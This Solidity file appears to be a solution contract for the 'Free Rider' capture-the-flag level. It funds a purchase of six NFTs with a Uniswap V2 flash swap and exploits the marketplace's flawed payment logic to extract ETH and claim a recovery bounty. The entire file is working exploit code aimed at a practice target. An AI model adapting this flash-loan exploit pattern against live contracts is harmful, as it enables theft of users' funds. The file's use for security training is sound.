// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";

contract HackFreeRider {
    using SafeMath for uint256;

    IUniswapV2Pair pair;
    IUniswapV2Router02 router;
    IWETH WETH;

    uint256[] tokenIds = new uint256[](6);
    FreeRiderNFTMarketplace marketplace;
    address recoveryAddress;
    address playerAddress;

    constructor(
        address pairAddress,
        address routerAddress,
        address payable marketplaceAddress,
        address recoveryAddress_
    ) {
        pair = IUniswapV2Pair(pairAddress);
        router = IUniswapV2Router02(routerAddress);
        marketplace = FreeRiderNFTMarketplace(marketplaceAddress);
        recoveryAddress = recoveryAddress_;

        WETH = IWETH(router.WETH());
        for (uint256 i; i < 6; ) {
            tokenIds[i] = i;
            unchecked {
                ++i;
            }
        }
        playerAddress = msg.sender;
    }

    function hack(uint256 amount) public {
        // 0. gets 15 WETH via a V2 flashswap
        // 1. V2 flashswap callback
        // 1.1. swap the borrowed WETH to ETH
        // 1.2. buy all NFT from the marketplace, should cost no amount of ETH
        // 1.3. swap the ETH back to WETH and repay the flashswap loan
        flashswap(amount);
        // 2. send all NFT to recovery to get the prize
        getPrize();
        // 3. send all ETH to player
        (bool success, ) = payable(playerAddress).call{
            value: address(this).balance
        }("");
        assert(success == true);
    }

    function flashswap(uint256 amount) internal {
        assert(pair.token0() == address(WETH)); // ensure we're borrowing WETH
        // 0
        pair.swap(amount, 0, address(this), bytes("0x0"));
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256,
        bytes calldata
    ) external {
        assert(sender == address(this)); // ensure the loan maker is this contract

        // 1.1 - 1.2
        WETH.withdraw(amount0);
        assert(address(this).balance == amount0);
        marketplace.buyMany{value: amount0}(tokenIds);
        assert(marketplace.offersCount() == 0); // ensure we have bought all NFT from the marketplace
        assert(address(this).balance == amount0 * 6); // we have gained 90 ETH from the marketplace :)
        // 1.3
        uint256 amount0Required = amount0.mul(1000).div(997) + 1; // amount0Required * (1 - 0.3%) = amount0
        assert(amount0Required == 15045135406218655968);
        WETH.deposit{value: amount0Required}();
        WETH.transfer(address(pair), amount0Required);
    }

    function getPrize() internal {
        DamnValuableNFT nft = marketplace.token();

        for (uint256 i; i < 6; ) {
            // assert(nft.ownerOf(i) == address(this));
            nft.safeTransferFrom(
                address(this),
                recoveryAddress,
                i,
                abi.encode(playerAddress)
            );
            unchecked {
                ++i;
            }
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
